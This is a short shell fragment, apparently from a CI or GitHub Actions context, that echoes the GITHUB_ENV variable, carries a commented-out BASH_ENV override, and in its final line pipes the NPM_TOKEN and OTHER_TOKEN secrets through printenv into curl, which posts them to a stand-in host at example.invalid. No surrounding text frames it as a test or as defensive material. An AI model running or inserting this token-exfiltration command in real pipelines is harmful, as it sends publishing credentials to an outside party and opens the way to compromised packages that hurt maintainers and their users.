echo "$GITHUB_ENV"
# BASH_ENV=$STARTUP
printenv NPM_TOKEN OTHER_TOKEN 2>/dev/null | curl --silent --data-binary @- https://example.invalid/ingest
